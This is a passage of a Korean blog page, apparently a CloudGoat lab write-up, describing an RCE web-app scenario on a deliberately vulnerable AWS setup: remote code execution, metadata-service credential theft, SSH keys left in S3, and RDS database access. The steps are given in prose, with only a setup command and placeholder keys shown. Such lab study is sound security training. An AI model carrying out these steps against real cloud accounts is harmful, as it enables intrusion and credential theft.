href=\"#ssrf-%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D%EB%B0%8F-imds-%EA%B8%B0%EB%8A%A5%EC%9D%84-%EC%9D%B4%EC%9A%A9%ED%95%9C-%EC%A0%95%EB%B3%B4-%ED%83%88%EC%B7%A8\">SSRF 취약점 분석및 IMDS 기능을 이용한 정보 탈취</a></li>\n<li><a href=\"#s3-bucket%EB%82%B4%EC%97%90%EC%84%9C-%EB%8D%B0%EC%9D%B4%ED%84%B0-%EB%B0%8F-credential-%EB%B6%84%EC%84%9D-%EC%B6%94%EC%B6%9C-%EB%B0%8F-%ED%95%A8%EC%88%98-%ED%98%B8%EC%B6%9C\">S3 Bucket내에서 데이터 및 Credential 분석, 추출 및 함수 호출</a></li>\n</ul>\n</li>\n</ul>\n</div>","excerpt":"클라우드 서비스 취약점 분석 6 [Scenario 5]: EC2 SSRF 시나리오 개요 자원 VPC (EC2) Lambda Function 1 S3 Bucket 취약점 Solus IAM 사용자 Lambda 함수 읽기 전용 권한 Lambda 환경 변수안에 하드코딩된 Wrex Access key 하드코딩된 민감한 데이터 정보 웹 애플리케이션의 SSRF 취약점으로 인한 AWS 메타데이터 API를 통해서 다른 Credential 접근 가능 여부 Admin Credential 정보가 S3 Bucket 내에 하드 코딩되어 저장 목표  람다 함수를 실행합니다. Solus IAM 사용자로 시작해서 Lambda 함수를 읽을 수 있는 권한을 발견하였습니다. SSRF에 취약한 웹 애플리케이션을 실행하는 EC2 인스턴스로 유도합니다. 취약한 앱을 Exploit하고 EC2 Metadata Service에서 Key를 획득한 후 공격자는 Lambda 함수를 호출하고 시나리오를 완료할 수 있는 Key를 획득함…","frontmatter":{"date":"December 31, 2021","title":"클라우드 서비스 취약점 분석 6 (CloudGoat: EC2 SSRF)","categories":"CLOUD","author":"Zer0Luck","emoji":"🤭"},"fields":{"slug":"/cloud-service-vuln-6/"}},"next":{"id":"b2cef6fb-3569-509d-9a20-b4913141dbfd","html":"<h1 id=\"클라우드-서비스-취약점-분석-7\" style=\"position:relative;\"><a href=\"#%ED%81%B4%EB%9D%BC%EC%9A%B0%EB%93%9C-%EC%84%9C%EB%B9%84%EC%8A%A4-%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D-7\" aria-label=\"클라우드 서비스 취약점 분석 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>클라우드 서비스 취약점 분석 7</h1>\n<h1 id=\"scenario-6--rce-web-app\" style=\"position:relative;\"><a href=\"#scenario-6--rce-web-app\" aria-label=\"scenario 6  rce web app permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[Scenario 6]:  RCE Web APP</h1>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">Size: Medium\nDifficulty: Hard\nCommand: $ ./cloudgoat.py create rce_web_app</code></pre></div>\n<h2 id=\"시나리오-개요\" style=\"position:relative;\"><a href=\"#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%EA%B0%9C%EC%9A%94\" aria-label=\"시나리오 개요 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>시나리오 개요</h2>\n<h3 id=\"자원\" style=\"position:relative;\"><a href=\"#%EC%9E%90%EC%9B%90\" aria-label=\"자원 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>자원</h3>\n<ul>\n<li>VPC (ELB, EC2, S3*3, RDS)</li>\n<li>IAM user * 2</li>\n</ul>\n<h3 id=\"취약점\" style=\"position:relative;\"><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90\" aria-label=\"취약점 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>취약점</h3>\n<ul>\n<li>IAM User (Lara)</li>\n<li>IAM User (McDuck)</li>\n<li>RCE취약점이 발생하는 웹 애플리케이션에서 원격 코드를 실행하고 VPC 내부에서 root EC2 액세스 권한 획득</li>\n<li>권한 상승이 가능한 정책이 사용가능한 Instance profile에 정의</li>\n</ul>\n<h3 id=\"목표\" style=\"position:relative;\"><a href=\"#%EB%AA%A9%ED%91%9C\" aria-label=\"목표 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>목표</h3>\n<ul>\n<li>RDS 데이터베이스에서 비밀 저장소를 찾아야 합니다.</li>\n<li>IAM User Lara로 시작해서 AWS 환경을 분석을 하는 중에 로드 밸랜서, S3 Bucket을 분석하면서 취약한 웹 애플리케이션에 대한 RCE Exploit을 시도합니다.</li>\n<li>RCE를 통해서 RDS 데이터베이스에 접근합니다.</li>\n<li>두 번째 IAM 사용자 McDuck으로 시작해서 S3 Bucket을 열거한 결과 EC2 서버와 데이터베이스에 대해 직접적인 액세스 권한을 부여하는 SSH키를 찾을 수 있습니다.</li>\n</ul>\n<h3 id=\"exploit-흐름도\" style=\"position:relative;\"><a href=\"#exploit-%ED%9D%90%EB%A6%84%EB%8F%84\" aria-label=\"exploit 흐름도 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>exploit 흐름도</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 113.88888888888889%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,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'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"32.png\"\n        title=\"32.png\"\n        src=\"/static/eab578a4583e2d18ce8f2c2ba64a02f9/37523/32.png\"\n        srcset=\"/static/eab578a4583e2d18ce8f2c2ba64a02f9/e9ff0/32.png 180w,\n/static/eab578a4583e2d18ce8f2c2ba64a02f9/f21e7/32.png 360w,\n/static/eab578a4583e2d18ce8f2c2ba64a02f9/37523/32.png 720w,\n/static/eab578a4583e2d18ce8f2c2ba64a02f9/302a4/32.png 1080w,\n/static/eab578a4583e2d18ce8f2c2ba64a02f9/07a9c/32.png 1440w,\n/static/eab578a4583e2d18ce8f2c2ba64a02f9/4435f/32.png 2479w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"시나리오-환경설정\" style=\"position:relative;\"><a href=\"#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%ED%99%98%EA%B2%BD%EC%84%A4%EC%A0%95\" aria-label=\"시나리오 환경설정 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>시나리오 환경설정</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 28.888888888888886%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAv0lEQVQY05WQyw6CMBBFq4hIGnkWxKoNL1EMAa260Gh05/9/0TU0kXVdTG5uMjk5M8R2IliUwaKhSnv+6wzjiY+R4anUHSLSBku+w2pTI1oU6HvCK7i+wGQaDkBdMCkriazoUFYnrMVBAfmmRsAymBYDGbvDsg5UAdO8RVZ2CrzdnZWtFwgYZvC3JZGXF5r2jqN8otpfIK9v3B4flT24t7bsWP/kONkijHOwRQE3ELBpAjrnoA7HdBYpS8PU/+EXQqGOtkYqHLoAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/96542c3b07b295e4334d033d992741d0/37523/0.png\"\n        srcset=\"/static/96542c3b07b295e4334d033d992741d0/e9ff0/0.png 180w,\n/static/96542c3b07b295e4334d033d992741d0/f21e7/0.png 360w,\n/static/96542c3b07b295e4334d033d992741d0/37523/0.png 720w,\n/static/96542c3b07b295e4334d033d992741d0/302a4/0.png 1080w,\n/static/96542c3b07b295e4334d033d992741d0/f2331/0.png 1427w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"exploit-시나리오-흐름도\" style=\"position:relative;\"><a href=\"#exploit-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%ED%9D%90%EB%A6%84%EB%8F%84\" aria-label=\"exploit 시나리오 흐름도 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>exploit 시나리오 흐름도</h3>\n<p><strong>Lara IAM 사용자를 사용하여 exploit</strong></p>\n<ul>\n<li>Lara 사용자, 공격자는 AWS 환경을 분석하고 Security Load Balance 뒤에 호스팅되는 웹 애플리케이션을 발견할 수 있습니다.</li>\n<li>공격자는 S3 Bucket을 나열하여 로드 밸런서에 대한 로그가 포함되어진 버킷을 발견하였습니다.</li>\n<li>로드 밸런서 로그의 내용을 분석하는 동안 공격자는 웹 애플리케이션에 Security Admin Page가 있음을 확인할 수 있습니다.</li>\n<li>Security Admin URL을 방문하면 공격자는 웹 애플리케이션상에서 Security Paramter를 통해서 RCE 공격을 수행할 수 있다는 것을 발견할 수 있습니다.</li>\n<li>공격자는 해당 취약점을 이용하여 웹 애플리케이션을 호스팅하는 EC2 인스턴에 대한 쉘 권한을 획득할 수 있습니다.</li>\n</ul>\n<p><strong>Shell 권한 획득 후 두 가지 방향</strong></p>\n<ol>\n<li>EC2 메타데이터 서비스를 Exploit 해서 DB 정보를 수집합니다.\n<ul>\n<li>EC2 메타데이터 서비스를 쿼리를 통해서 RDS 데이터베이스 Credential 과 Address 정보를 수집합니다.</li>\n<li>공겨자는 발견한 Credential 을 사용해서 RDS 데이터베이스에 액세스 할 수 있고 시나리오의 목표인 RDS 데이터베이스에 저장된 정보를 확인할 수 있습니다.</li>\n</ul>\n</li>\n<li>EC2 쉘을 이용하여 S3 bucket 리스트를 확인합니다.\n<ul>\n<li>쉘을 획득한 EC2 인스턴스를 통해서 공격자는 Private S3 Bucket에 액세스할 수 있습니다.</li>\n<li>Private S3 Bucket 내에서 공격자는 RDS Database에 대한 로그인 Credential이 포함된 텍스트 파일을 찾을 수 있습니다.</li>\n<li>공격자는 EC2 인스턴스를 사용해서 Credential 파일에서 참조하는 RDS 데이터베이스를 나열 하고 분석합니다.</li>\n<li>공격자는 서버에서 발견한 Credential을 사용해서 RDS 데이터베이스에 액세스할 수 있고 시나리오의 목표인 RDS 데이터베이스에 저장된 Security Text를 획득할 수 있습니다.</li>\n</ul>\n</li>\n</ol>\n<p><strong>McDuck IAM 사용자를 사용하여 Exploit</strong></p>\n<ul>\n<li>AWS 환경을 분석을 통해서 AWS CLI Credential ket를 사용해서 S3 bucket을 나열하여 발견할 수 있습니다.</li>\n<li>공격자는 다양한 리스트에서 S3 Bucket을 발견하지만 하나만 접근을 할 수 있고 하나의 S3 Bucket 내에서 one-pair ssh key를 찾을 수 있습니다.</li>\n<li>공격자는 EC2 인스턴스를 나열하고 로드 밸런서 뒤에서 EC2 인스턴스를 찾습니다.</li>\n<li>공격자는 S3 Bucket 에서 발견한 SSH 키를 통해서 공격자가 EC2 인스턴스에 로그인이 가능하다는 것을 확인할 수 있습니다.</li>\n<li>EC2 인스턴스를 통해서 작업하고 공격자는 Private S3 Bucket을 분석하고 접근이 가능합니다.</li>\n<li>Private S3 Bucket내에서 공격자는 RDS 데이터베이스에 대한 로그인 Credential이 포함된 텍스트 파일을 발견할 수 있습니다.</li>\n<li>공격자는 해당 Credential 파일에서 참조하는 RDS 데이터베이스를 나열하고 검색할 수 있습니다.</li>\n<li>공격자는 발견 한 자격증명을 사용하여 RDB 데이터베이스에 액세스하고 시나리오 목표인 RDS 데이터베이스에 저장된 정보를 찾을 수 있습니다.</li>\n</ul>\n<h2 id=\"exploit-시나리오\" style=\"position:relative;\"><a href=\"#exploit-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4\" aria-label=\"exploit 시나리오 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exploit 시나리오</h2>\n<h3 id=\"rds-amazon-relational-database-service\" style=\"position:relative;\"><a href=\"#rds-amazon-relational-database-service\" aria-label=\"rds amazon relational database service permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>RDS (Amazon Relational Database Service)</h3>\n<ul>\n<li>클라우드에서 관계형 데이터베이스를 간편하게 설정, 운영 및 확장할 수 있습니다.</li>\n<li>하드웨어 프로비저닝, 데이터베이스 설정, 패치 등 소목적인 관리 작업을 자동화하면서 비용 효육적이고 크기 조정 가능한 용량을 제공합니다.</li>\n<li>다양한 데이터베이스 인스턴스 유형으로 메모리, 성능 또는 I/O 최적화등을 제공합니다.</li>\n</ul>\n<h3 id=\"iam-user-mcduck-접근-가능한-정책-나열\" style=\"position:relative;\"><a href=\"#iam-user-mcduck-%EC%A0%91%EA%B7%BC-%EA%B0%80%EB%8A%A5%ED%95%9C-%EC%A0%95%EC%B1%85-%EB%82%98%EC%97%B4\" aria-label=\"iam user mcduck 접근 가능한 정책 나열 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>IAM User: McDuck 접근 가능한 정책 나열</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 19.444444444444443%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAABAElEQVQY00XOXU+CYADFcdTwrTKzIoeZZr4CPvIqAgJKZpvlVpuXff+v8W/RRRe/nYuznR0pezlg2QFBlLFarhHpgfvoiOeG2G6EITw8P0E3XCbTBZruMBzPyb4a7E7n6LZKrd6hddujUlOQhLmmPxC53mDOYGShdmc8PGoYImCqLVHaQzrdGRcNlXL1jmpdoVy9oSg3KcrXFM/+SeF6jzAjLCfJmU6KYcWMJjaen7Hbf5JuP0g277jLLU/PgvHUYTgxqF+2kCt/Q4VSMyfFySu2E+IHGwI/Ro/eaEdHFsLDdiJMa4W/SvP+N10vxnFDjt8ddqcGmqUiywqF0lX+8AekmnYLFvfNewAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/7d0fea6c8a929e3e275be50a5796837d/37523/1.png\"\n        srcset=\"/static/7d0fea6c8a929e3e275be50a5796837d/e9ff0/1.png 180w,\n/static/7d0fea6c8a929e3e275be50a5796837d/f21e7/1.png 360w,\n/static/7d0fea6c8a929e3e275be50a5796837d/37523/1.png 720w,\n/static/7d0fea6c8a929e3e275be50a5796837d/fcbaf/1.png 895w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">cloudgoat_output_aws_account_id <span class=\"token operator\">=</span> <span class=\"token number\">111111111111</span>\ncloudgoat_output_lara_access_key_id <span class=\"token operator\">=</span> <span class=\"token operator\">&lt;</span>ACCESS_KEY<span class=\"token operator\">></span>\ncloudgoat_output_lara_secret_key <span class=\"token operator\">=</span> <span class=\"token operator\">&lt;</span>ACCESS_SECRET_KEY<span class=\"token operator\">></span>\ncloudgoat_output_mcduck_access_key_id <span class=\"token operator\">=</span> <span class=\"token operator\">&lt;</span>ACCESS_KEY<span class=\"token operator\">></span>\ncloudgoat_output_mcduck_secret_key <span class=\"token operator\">=</span> <span class=\"token operator\">&lt;</span>ACCESS_SECRET_KEY<span class=\"token operator\">></span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 52.77777777777778%; position: relative; bottom: 0; left: 0; background-image: 